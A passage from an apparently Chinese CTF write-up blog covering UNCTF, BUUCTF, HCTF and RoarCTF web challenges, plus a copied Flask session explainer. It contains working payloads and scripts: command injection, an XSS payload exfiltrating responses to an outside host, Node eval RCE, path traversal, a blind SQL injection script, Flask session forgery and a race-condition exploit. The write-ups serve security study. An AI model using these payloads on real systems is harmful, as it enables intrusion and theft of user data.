&quot;&quot;`dir`&quot;&quot;</code></pre><p>可以看到反引号成功逃逸。</p><p>我们到题目中尝试列目录，没有 <code>ls</code> 可以用 <code>dir</code></p><pre><code>?a=`dir%20/`响应：bin dev home lib64 mnt proc run srv sys usr boot etc lib media opt root sbin start.sh tmp var: cannot open `bin dev home lib64\011mnt proc run\011 srv\011 sys\011usr\012boot etc lib\011 media\011opt root sbin start.sh tmp\011var&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><p>查找flag </p><pre><code>?a=`/b??/gr??%20-R%20unctf`响应：.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}: cannot open `.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><h2 id="another-way"><a href="#another-way" class="headerlink" title="another way"></a>another way</h2><p>第二个正则 <code>\\|\n</code> 会解释为竖线和换行，所以利用 <code>%0a</code> 进行换行绕过，同时末尾使用 <code>%20#</code> 来终止命令处理双引号</p><pre><code>?a=\&amp;b=%0a/???/gr?p%20-R%20ctf%20%23效果是file&quot;\&quot;&quot;/???/gr?p -R ctf #&quot;</code></pre><h2 id="easy-xss"><a href="#easy-xss" class="headerlink" title="easy xss"></a>easy xss</h2><p>在留言板处提交 xss 发现能够触发，访问储存的路径发现一个接口</p><pre><code>http://112.74.37.15:8010/index.php/treehole/view?id=5dcd1d7bd11a4</code></pre><p>此时的请求头里带上了 <code>XMLHttpRequest</code> ，同时不带参数访问时得到 debug 页面，可以看到 XHR请求带上了 cookie ，于是我们构造 XHR 请求</p><pre><code>&lt;img src=&apos;/efefefe&apos; onerror=&quot;xmlhttp=newXMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){location.href=&apos;http://xssye.com/kOaI/?flag=&apos;xmlhttp.responseText.match(&apos;flag\\{(.\*?)\\}&apos;)[1]}};xmlhttp.open(&apos;GET&apos;,&apos;/index.php/treehole/view?id=&apos;,true);xmlhttp.send(&apos;&apos;);&quot;/\&gt;</code></pre><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>查看源码发现各个接口</p><pre><code>      switch (e.cmd) {        case &apos;name&apos;:          this.nickname = e.msg,          this.kesshoubanMsg(`Change nickname ${this.nickname        }         success!`);        break;      case &apos;error&apos;:        this.kesshoubanMsg(`🙁${e.msg    }    `);    break;  case &apos;calc&apos;:    this.kesshoubanMsg(`${e.msg  }  `);  break;case &apos;flag&apos;:  this.kesshoubanMsg(`${e.msg}`);</code></pre><p>修改完名字后测试 <code>/calc 1+1</code> 发现成功执行，存在代码注入参考<a href="http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p><p>尝试 <code>/calc require(&#39;child_process&#39;).execSync(&#39;cat$IFS/flag&#39;).toString();</code> 其中空格过滤绕过 $IFS ，同时Sync采用非阻塞返回。</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask-session</title>
      <link href="/2019/11/06/flask-session/"/>
      <url>/2019/11/06/flask-session/</url>
      
        <content type="html"><![CDATA[<h1 id="flask-session"><a href="#flask-session" class="headerlink" title="flask-session"></a>flask-session</h1><p>11/6/2019 8:43:45 PM </p><p>搬运文章 <a href="https://cizixs.com/2017/03/08/flask-insight-session/" target="_blank" rel="noopener">https://cizixs.com/2017/03/08/flask-insight-session/</a></p><p><strong>session是如何使用的：</strong></p><p>cookie和session结合使用：web开发发展至今，cookie和session的使用已经出现了一些非常成熟的方案。在如今的市场或者企业里，一般有两种存储方式：</p><ul><li><p>存储在服务端：通过cookie存储一个<code>session_id</code>，然后具体的数据则是保存在session中。如果用户已经登录，则服务器会在cookie中保存一个<code>session_id</code>，下次再次请求的时候，会把该<code>session_id</code>携带上来，服务器根据session_id在session库中获取用户的session数据。就能知道该用户到底是谁，以及之前保存的一些状态信息。这种专业术语叫做<code>server side session</code>。</p></li><li><p>将session数据加密，然后存储在cookie中。这种专业术语叫做<code>client side session</code>。flask采用的就是这种方式，但是也可以替换成其他形式。</p></li></ul><p>在解析 session 的实现之前，我们先介绍一下 session 怎么使用。session 可以看做是在不同的请求之间保存数据的方法，因为 HTTP 是无状态的协议，但是在业务应用上我们希望知道不同请求是否是同一个人发起的。比如购物网站在用户点击进入购物车的时候，服务器需要知道是哪个用户执行了这个操作。</p><p>在 flask 中使用 session 也很简单，只要使用 from flask import session 导入这个变量，在代码中就能直接通过读写它和 session 交互。</p><pre><code>from flask import Flask, session, escape, requestapp = Flask(__name__)app.secret_key = &apos;please-generate-a-random-secret_key&apos;@app.route(&quot;/&quot;)def index():    if &apos;username&apos; in session:        return &apos;hello, {}\n&apos;.format(escape(session[&apos;username&apos;]))    return &apos;hello, stranger\n&apos;@app.route(&quot;/login&quot;, methods=[&apos;POST&apos;])def login():    session[&apos;username&apos;] = request.form[&apos;username&apos;]    return &apos;login success&apos;if __name__ == &apos;__main__&apos;:    app.run(host=&apos;0.0.0.0&apos;, port=5000, debug=True)</code></pre><p>上面这段代码模拟了一个非常简单的登陆逻辑，用户访问 <code>POST /login</code> 来登陆，后面访问页面的时候 <code>GET /</code>，会返回该用户的名字</p><p>直接访问：</p><pre><code>GET / HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateHost: 127.0.0.1:5000User-Agent: HTTPie/0.8.0HTTP/1.0 200 OKContent-Length: 14Content-Type: text/html; charset=utf-8Date: Wed, 01 Mar 2017 04:22:18 GMTServer: Werkzeug/0.11.2 Python/2.7.10hello stranger</code></pre><p>用户名cizixs 模拟登录：</p><pre><code>POST /login HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateContent-Length: 15Content-Type: application/x-www-form-urlencoded; charset=utf-8Host: 127.0.0.1:5000User-Agent: HTTPie/0.8.0username=cizixsHTTP/1.0 200 OKContent-Length: 13Content-Type: text/html; charset=utf-8Date: Wed, 01 Mar 2017 04:20:54 GMTServer: Werkzeug/0.11.2 Python/2.7.10Set-Cookie: session=eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5fdpg.fqm3FTv0kYE2TuOyGF1mx2RuYQ4; HttpOnly; Path=/login success</code></pre><p>最重要的是我们看到 response 中有 <code>Set-Cookie</code> 的头部，cookie 的键是 <code>session</code></p><p>这次请求我们带上上次的 cookie 访问：</p><pre><code>GET / HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateCookie: session=eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5fevg.LE03yEZDWTUMQW-nNkTr1zBEhKkHost: 127.0.0.1:5000User-Agent: HTTPie/0.8.0HTTP/1.0 200 OKContent-Length: 11Content-Type: text/html; charset=utf-8Date: Wed, 01 Mar 2017 04:25:46 GMTServer: Werkzeug/0.11.2 Python/2.7.10Set-Cookie: session=eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5feyg.sfFCDIqfef4i8cvxUClUUGQNcHA; HttpOnly; Path=/hellocizixs</code></pre><p>可以看到我们成功的不通过用户名登陆。</p><p>总结一下：session 是通过在客户端设置 cookie 实现的，每次客户端发送请求的时候会附带着所有的 cookie，而里面保存着一些重要的信息（比如这里的用户信息），这样服务器端就能知道客户端的信息，然后根据这些数据做出对应的判断，就好像不同请求之间是有记忆的。</p><p><strong>请求过程</strong></p><ul><li>请求过来的时候，flask 会根据 cookie 信息创建出 session 变量（如果 cookie 不存在，这个变量有可能为空），保存在该请求的上下文中</li><li>视图函数可以获取 session 中的信息，实现自己的逻辑处理</li><li>flask 会在发送 response 的时候，根据 session 的值，把它写回到 cookie 中</li></ul><p>注意：session 和 cookie 的转化过程中，应该考虑到安全性，不然直接使用伪造的 cookie 会是个很大的安全隐患。</p><p><strong>加密session</strong></p><p>搬运<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p><p>flask 处理 session 安全性问题时在代码中新建了 <code>URLSafeTimedSerializer</code> 类 ，用它的dumps方法将类型为字典的 <code>session</code> 对象序列化成字符串，然后用 <code>response.set_cookie</code> 将最后的内容保存在cookie中。 </p><p><code>URLSafeTimedSerializer</code> 做了什么？主要经过几步</p><ul><li>json.dumps 将对象转换成json字符串，作为数据</li><li>如果数据压缩后长度更短，则用zlib库进行压缩</li><li>将数据用base64编码</li><li>通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割</li></ul><p>第4步就解决了用户篡改session的问题，因为在不知道 <code>secret_key</code> 的情况下，是无法伪造签名的。注意到，在第4步中，flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其 session 的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p><p><strong>解密session</strong></p><p>有时候在开发或者调试的过程中，需要了解 cookie 中保存的到底是什么值，可以通过手动解析它的值。session 在 cookie 中的值，是一个字符串，由句号分割成三个部分。第一部分是 base64 加密的数据，第二部分是时间戳，第三部分是校验信息。</p><p>前面两部分的内容可以通过下面的方式获取，代码也可直观，就不给出解释了：</p><pre><code>In [1]: from itsdangerous import *In [2]: s = &apos;eyJ1c2VybmFtZSI6ImNpeml4cyJ9.C5fdpg.fqm3FTv0kYE2TuOyGF1mx2RuYQ4&apos;In [3]: data, timstamp, secret = s.split(&apos;.&apos;)In [4]: base64_decode(data)Out[4]: &apos;{&quot;username&quot;:&quot;cizixs&quot;}&apos;In [5]: bytes_to_int(base64_decode(timstamp))Out[5]: 194502054In [7]: time.strftime(&apos;%Y-%m-%d %H:%I%S&apos;, time.localtime(194502054+EPOCH))Out[7]: &apos;2017-03-01 12:1254&apos;</code></pre><p><strong>session使用</strong></p><p>上面看到 session 其实就像一个字典，我们使用的时候可以直接使用：</p><pre><code>session[&apos;name&apos;] = name</code></pre>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF 刷题记录</title>
      <link href="/2019/10/23/BUUCTF-WP/"/>
      <url>/2019/10/23/BUUCTF-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="BUUCTF-wp"><a href="#BUUCTF-wp" class="headerlink" title="BUUCTF  wp"></a>BUUCTF  wp</h1><p>10/23/2019 2:43:09 PM </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h3><p>查看源码</p><pre><code> &lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) {                echo &quot;you can&apos;t see it&quot;;                return false;            }            if (in_array($page, $whitelist)) {                return true;            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)            );            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)            );            if (in_array($_page, $whitelist)) {                return true;            }            echo &quot;you can&apos;t see it&quot;;            return false;        }    }    if (! empty($_REQUEST[&apos;file&apos;])        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])    ) {        include $_REQUEST[&apos;file&apos;];        exit;    } else {        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    }  ?&gt; </code></pre><p>存在 <code>phpmyadmin 4.8.1</code> 远程文件包含漏洞 <code>cve-2018-12613</code></p><blockquote><p>mb_strpos — 查找字符串在另一个字符串中首次出现的位置</p><p>mb_substr — 获取部分字符串</p></blockquote><p>因为考虑到 <code>file</code> 可能带参数的问题所以先进行了一次 <code>mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</code> ，如果这里接下来的判断通过则直接返回 <code>true</code> 。如果失败则对返回的结果进行一次 <code>urldecode</code> ，我们知道浏览器会自动将传输的数据进行一次解码，所以我们传入二次编码的 <code>?-&gt;%253F</code> 之后会经过两次解码得到 <code>?</code> ,从而使返回 <code>true</code> .在 <code>checkfile</code> 返回 <code>true</code> 之后我们就有了目录穿越包含文件。</p><p>我们有两种方法:</p><pre><code>?file=hint.php?../../../../../ffffllllaaaaggggfile=hint.php%253f../../../../../ffffllllaaaagggg</code></pre><h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h2><p>打开页面发现三个链接，内容如下</p><pre><code>/flag.txt                //flag in /fllllllllllllag/welcome.txt            //render/hints.txt                //md5(cookie_secret+md5(filename))</code></pre><p>应该是模板注入，而且需要 cookie_secret .抓包并没有抓到 cookie </p><p>观察链接： <code>file?filename=/flag.txt&amp;filehash=07c1e7d13389a10b75c75c9884c867fb</code> 我们直接访问/fllllllllllllag 报错 <code>/error?msg=Error</code> ，在error 这里尝试 SSTI： <code>error?msg=1</code> 可以执行静态表达式，但是不能做运算。</p><p>在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象</p><pre><code>1 &lt;title&gt;2     {{ escape(handler.settings["blog_title"]) }}3 &lt;/title&gt;</code></pre><p>但是奇怪的是RequestHandler中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性！后来重新翻了一下文档，发现又是一个别名。</p><pre><code>RequestHandler.settingsAn alias for self.application.settings.</code></pre><p>handler 指向RequestHandler</p><p>而RequestHandler.settings又指向self.application.settings</p><p>所有handler.settings就指向RequestHandler.application.settings了！</p><p>所以当我们访问 <code>RequestHandler.application.settings</code> 失败时，我们访问 <code>handler.settings</code> 得到 <code>secret_key</code> ,之后使用脚本进行 md5加密之后访问即可：</p><pre><code>import hashlibdef md5value(s):    md5 = hashlib.md5()    md5.update(s.encode())    return md5.hexdigest()def mdfive2():    filename = &apos;/fllllllllllllag&apos;    cookie = r&quot;M)Z.&gt;}{O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r&quot;    #print(md5value(filename))    # print(md5value(&apos;*c].)Y!x&lt;kr1e2_oQ(zO6Xd5D9ZKw7IPCs#4h~R-JFa3Vp8B0N&gt;%+WgjHbvfM@[U&apos;))    # print(&apos;&apos;+md5value(filename))    print(md5value(cookie + md5value(filename)))#hints md5(cookie_secret+md5(filename))mdfive2()</code></pre><h2 id="CISCN-hack-world"><a href="#CISCN-hack-world" class="headerlink" title="CISCN-hack_world"></a>CISCN-hack_world</h2><p>进入靶机，看到：</p><pre><code>All You Want Is In Table &apos;flag&apos; and the column is &apos;flag&apos;Now, just give the id of passage</code></pre><p>输入0，1，2 分别有不同回显，输入部分关键字显示 <code>bool(false)</code> ,应该是布尔盲注。在bp里FUZZ，<code>or、and、/*、union、空格</code>等都被过滤了。</p><p>直接 <code>select flag from flag</code> 查询被过滤，绕过空格可以用括号 <code>select(flag)from(flag)</code> </p><p>用二分法猜解名字</p><pre><code>import requestsimport timeurl = &apos;http://be659fb8-1739-4a9f-9f9e-8e2be1e33ce6.node3.buuoj.cn/index.php&apos;data = {&quot;id&quot;:&quot;&quot;}flag = &apos;flag{&apos;i = 6while True:    begin = 32    end = 126    tmp = (begin+end)//2    while begin&lt;end:        print(begin,tmp,end)        time.sleep(1)        data[&quot;id&quot;] = &quot;if(ascii(substr((select(flag)from(flag)),{},1))&gt;{},1,2)&quot;.format(i,tmp)        r = requests.post(url,data=data)        if &apos;Hello&apos; in r.text:            begin = tmp+1            tmp = (begin+end)//2        else:            end = tmp            tmp = (begin+end)//2    flag+=chr(tmp)    print(flag)    i+=1    if flag[-1]==&apos;}&apos;:        break</code></pre><h2 id="HCTF-admin"><a href="#HCTF-admin" class="headerlink" title="HCTF admin"></a>HCTF admin</h2><p>11/6/2019 8:43:40 PM </p><h3 id="flask-session-伪造"><a href="#flask-session-伪造" class="headerlink" title="flask-session 伪造"></a>flask-session 伪造</h3><p>从源码得到提示下载到了源码</p><p>贴一部分代码：</p><pre><code>index.html{% if current_user.is_authenticated and session['name'] == 'admin' %}<h1 class="nav">hctf{xxxxxxxxx}</h1>{% endif %}&lt;!-- you are not admin --&gt;&lt;h1 class=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;config.pyimport osclass Config(object):    SECRET_KEY = os.environ.get(&apos;SECRET_KEY&apos;) or &apos;ckj123&apos;    SQLALCHEMY_DATABASE_URI = &apos;mysql+pymysql://root:adsl1234@db:3306/test&apos;    SQLALCHEMY_TRACK_MODIFICATIONS = Trueroutes.py/change@app.route(&apos;/change&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])def change():    if not current_user.is_authenticated:        return redirect(url_for(&apos;login&apos;))    form = NewpasswordForm()    if request.method == &apos;POST&apos;:        name = strlower(session[&apos;name&apos;])        user = User.query.filter_by(username=name).first()        user.set_password(form.newpassword.data)        db.session.commit()        flash(&apos;change successful&apos;)        return redirect(url_for(&apos;index&apos;))    return render_template(&apos;change.html&apos;, title = &apos;change&apos;, form = form)</code></pre><p>可以看到用 admin 账户登陆即可得到 flag，这里涉及到了 flask session 伪造，简单搜索我们可以很容易搜到p神的 session<br>解密脚本：</p><pre><code>#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload):    payload, sig = payload.rsplit(b&apos;.&apos;, 1)    payload, timestamp = payload.rsplit(b&apos;.&apos;, 1)    decompress = False    if payload.startswith(b&apos;.&apos;):        payload = payload[1:]        decompress = True    try:        payload = base64_decode(payload)    except Exception as e:        raise Exception(&apos;Could not base64 decode the payload because of &apos;                         &apos;an exception&apos;)    if decompress:        try:            payload = zlib.decompress(payload)        except Exception as e:            raise Exception(&apos;Could not zlib decompress the payload before &apos;                             &apos;decoding the payload&apos;)    return session_json_serializer.loads(payload)if __name__ == &apos;__main__&apos;:    print(decryption(sys.argv[1].encode()))</code></pre><p>先注册一个普通账号进行登陆，得到cookie，经过脚本解密 <code>python3 py3-flask_session_decode.py cookie</code> 得到：</p><pre><code>{&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;bbf3746b9cd211acd60600a7d24fc55c2dcf65c790142d9b984e1d954d61201b76dbcc4c5221672ce13679718528b34f3f45b7afc79b6384c9b8e7168aa6e8f3&apos;, &apos;csrf_token&apos;: b&apos;b7b7b2574958167d3670aa0e5bf46e47b60d1e39&apos;, &apos;image&apos;: b&apos;TmDp&apos;, &apos;name&apos;: &apos;goya&apos;, &apos;user_id&apos;: &apos;10&apos;}</code></pre><p>通过源码我们看到这句话 <code>SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;</code> ，其中 <code>environ</code> 是一个字符串所对应环境的映像对象，例如 </p><pre><code>&gt;&gt;&gt; os.environ[&apos;TEMP&apos;]&apos;C:\\Users\\*****\\AppData\\Local\\Temp&apos;</code></pre><p>当获取不到 <code>SECRET_KEY</code> 时就使用 <code>ckj123</code> 作为密钥，这里我们不确定是不是能获取到环境变量里的key，但是我们用 ckj123 先进行测试。</p><p>利用搜到的脚本 <a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a> 修改 <code>name</code> 为 <code>admin</code> 来生成伪造的cookie：</p><pre><code>python2 flask_session_cookie_manager2.py encode -s &quot;ckj123&quot; -t &quot;{&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;bbf3746b9cd211acd60600a7d24fc55c2dcf65c790142d9b984e1d954d61201b76dbcc4c5221672ce13679718528b34f3f45b7afc79b6384c9b8e7168aa6e8f3&apos;, &apos;csrf_token&apos;: b&apos;b7b7b2574958167d3670aa0e5bf46e47b60d1e39&apos;, &apos;image&apos;: b&apos;TmDp&apos;, &apos;name&apos;: &apos;admin&apos;, &apos;user_id&apos;: &apos;10&apos;}&quot;</code></pre><p>生成新 cookie：</p><pre><code>.eJxNkEGPgjAQhf_KpmcPWPBC4kFSIZDMEE2xaS-ERQQKdRPUKBj_-1Y3WT1NMm_me2_mTvLDUJ0a4p-HSzUjebsn_p18fROfSJMYmEoHTbyQdDMCDxtbKTB5hWjtKhY7ysAcBYwqQoN6p3HqrsA3o2J9m_LaUTzsUp45iskb6NVN6pKqKNFy2mrksWVKFwz2wIHaXRd4PQfdtDBtDVDpoIhdKZTl9i1q8DCChdRNj9OaplHYoMk8pWFJHjNSnoZDfv7pquP7BL1vkcYj8tKxMbynnWJPq6CRPOhRJAaZ6pHZOR10ILIp3SxfuNYUdfVP2kXzdbn6U46FeQtSbM-F8F7C5VQNnx8EvrL9xy8gAnGJ.XcK0Ow.1V55Ih_Ip48Y5fgVUgbSNrQlWyU</code></pre><p>此时我们替换已经登陆账号的 cookie 即可得到flag</p><h3 id="unicode欺骗"><a href="#unicode欺骗" class="headerlink" title="unicode欺骗"></a>unicode欺骗</h3><p>看WP看到的另一种方法，挺有意思</p><p>观察路由处的代码：</p><pre><code>@app.route(&apos;/register&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])def register():    if current_user.is_authenticated:        return redirect(url_for(&apos;index&apos;))    form = RegisterForm()    if request.method == &apos;POST&apos;:        **name = strlower(form.username.data)**        if session.get(&apos;image&apos;).lower() != form.verify_code.data.lower():            flash(&apos;Wrong verify code.&apos;)            return render_template(&apos;register.html&apos;, title = &apos;register&apos;, form=form)        if User.query.filter_by(username = name).first():            flash(&apos;The username has been registered&apos;)            return redirect(url_for(&apos;register&apos;))        user = User(username=name)        user.set_password(form.password.data)        db.session.add(user)        db.session.commit()        flash(&apos;register successful&apos;)        return redirect(url_for(&apos;login&apos;))    return render_template(&apos;register.html&apos;, title = &apos;register&apos;, form = form)@app.route(&apos;/login&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])def login():    if current_user.is_authenticated:        return redirect(url_for(&apos;index&apos;))    form = LoginForm()    if request.method == &apos;POST&apos;:        **name = strlower(form.username.data)**        session[&apos;name&apos;] = name        user = User.query.filter_by(username=name).first()        if user is None or not user.check_password(form.password.data):            flash(&apos;Invalid username or password&apos;)            return redirect(url_for(&apos;login&apos;))        login_user(user, remember=form.remember_me.data)        return redirect(url_for(&apos;index&apos;))    return render_template(&apos;login.html&apos;, title = &apos;login&apos;, form = form)@app.route(&apos;/change&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])def change():    if not current_user.is_authenticated:        return redirect(url_for(&apos;login&apos;))    form = NewpasswordForm()    if request.method == &apos;POST&apos;:        **name = strlower(session[&apos;name&apos;])**        user = User.query.filter_by(username=name).first()        user.set_password(form.newpassword.data)        db.session.commit()        flash(&apos;change successful&apos;)        return redirect(url_for(&apos;index&apos;))    return render_template(&apos;change.html&apos;, title = &apos;change&apos;, form = form)</code></pre><p>python 已经有了自己的 lower() 函数不用，用了自己定义的 strlower() ，进到这个函数：</p><pre><code>def strlower(username):    username = nodeprep.prepare(username)    return username</code></pre><p>可以看到 <code>from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</code> 这个函数来自 twisted ,而题目中 <code>Twisted==10.2.0</code> ,版本差距有点大。</p><p>对于一些字符，<a href="https://unicode-table.com/en/search/?q=small+capital" target="_blank" rel="noopener">https://unicode-table.com/en/search/?q=small+capital</a> 这个函数的作用就是</p><pre><code>ᴀ -&gt; A -&gt; a</code></pre><p>我们在上面的网站上找到一个 <code>ā</code> ，然后注册 <code>ādmin</code> ,此时经过一次 <code>strlower()</code> 变为 <code>ADMIN</code> ，之后我们登陆 <code>ADMIN</code> ，再经过一次 <code>strlower()</code> 就成为了 <code>admin</code> 。</p><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>先注册一个用户然后开一个线程改密码，另一个线程使用 admin 登陆，在某一瞬间生成 admin 的session 时我们改密码的操作也到了，这时就可以修改密码了</p><pre><code>exp.pyimport requestsimport threadingdef login(s, username, password):    data = {        &apos;username&apos;: username,        &apos;password&apos;: password,        &apos;submit&apos;: &apos;&apos;    }    return s.post(&quot;http://admin.2018.hctf.io/login&quot;, data=data)def logout(s):    return s.get(&quot;http://admin.2018.hctf.io/logout&quot;)def change(s, newpassword):    data = {        &apos;newpassword&apos;:newpassword    }    return s.post(&quot;http://admin.2018.hctf.io/change&quot;, data=data)def func1(s):    login(s, &apos;skysec&apos;, &apos;skysec&apos;)    change(s, &apos;skysec&apos;)def func2(s):    logout(s)    res = login(s, &apos;admin&apos;, &apos;skysec&apos;)    if &apos;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&apos; in res.text:        print(&apos;finish&apos;)def main():    for i in range(1000):        print(i)        s = requests.Session()        t1 = threading.Thread(target=func1, args=(s,))        t2 = threading.Thread(target=func2, args=(s,))        t1.start()        t2.start()if __name__ == &quot;__main__&quot;:    main()</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>roarctf 2019</title>
      <link href="/2019/10/16/roarctf-2019/"/>
      <url>/2019/10/16/roarctf-2019/</url>
      
        <content type="html"><![CDATA[<h1 id="roarctf-2019"><a href="#roarctf-2019" class="headerlink" title="roarctf 2019"></a>roarctf 2019</h1><p>10/16/2019 4:45:49 PM </p><h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>拿到题目看到文件下载的接口，尝试 <code>/Download?filename=help.docx</code> ,发现没法下载，尝试下载网页上的照片发现也下载不了，后来就跑偏了，在想会不会是 <code>SSTI</code> ?fuzz了半天也没找到思路.  🎨</p><p>改变请求方式为 <code>post</code> 即可成功下载到 <code>help.docx</code> ,里边没有什么有用的信息。 </p><p>随便下载一个不存在的文件，得到报错信息里有服务器版本信息。做的时候就被难到的地方就是文件下载不知道下载什么东西。记得上次碰到这种题的时候还是 <code>SUCTF</code> 读 <code>nginx</code> 配置文件</p><h3 id="什么是-WEB-INF"><a href="#什么是-WEB-INF" class="headerlink" title="什么是 WEB-INF"></a>什么是 WEB-INF</h3><blockquote><p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p></blockquote><ol><li><p>/WEB-INF/web.xml</p><p> Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p></li><li><p>/WEB-INF/classes/</p><p> 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中（是该目录不能包含在.jar文件中）。</p></li></ol><p>其他的配置文件介绍看<a href="https://baike.baidu.com/item/web-inf" title="这里" target="_blank" rel="noopener">https://baike.baidu.com/item/web-inf</a></p><p>事实上就是在xml中配置好映射路径然后进行对某些含受保护内容文件的访问。</p><p>我们访问 <code>WEB-INF/web.xml</code> 发现操作flag的关键配置</p><p>按照映射关系访问 <code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code> 即可得到解密的字符串，base64解密即可</p><h2 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h2><p>右键查看源码</p><pre><code>&lt;?phperror_reporting(0);if(!isset($_GET[&apos;num&apos;])){    show_source(__FILE__);}else{        $str = $_GET[&apos;num&apos;];        $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;,&apos;\$&apos;,&apos;\\&apos;,&apos;\^&apos;];        foreach ($blacklist as $blackitem) {                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) {                        die(&quot;what are you want to do?&quot;);                }        }        eval(&apos;echo &apos;.$str.&apos;;&apos;);}?&gt; </code></pre><p>有waf，这里有两种方法绕过：</p><ol><li>利用字符串解析特性 Bypass</li></ol><p>原理看这篇文章：<br><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p><p>这里说一下大概意思<br> PHP 处理 GET or POST 请求时将查询字符串转换成数组 <code>/?foo=bar becomes Array([foo] =&gt; &quot;bar&quot;)</code> 。参数名里的一些字符会被移除或替换成下划线 <code>/?%20news[id%00=42 will be converted to Array([news_id] =&gt; 42)</code> 如果WAF规则是参数里含有一个非数值型的值时进行拦截时，我们就可以用下列语句绕过<code>/news.php?%20news[id%00=42&quot;+AND+1=0--</code> 它会被存储在 <code>$_GET[&quot;news_id&quot;]</code> 。</p><p>这是测试php是如何处理特殊字符：</p><pre><code>&lt;?phpforeach(    [        &quot;{chr}foo_bar&quot;,        &quot;foo{chr}bar&quot;,        &quot;foo_bar{chr}&quot;    ] as $k =&gt; $arg) {    for($i=0;$i&lt;=255;$i++) 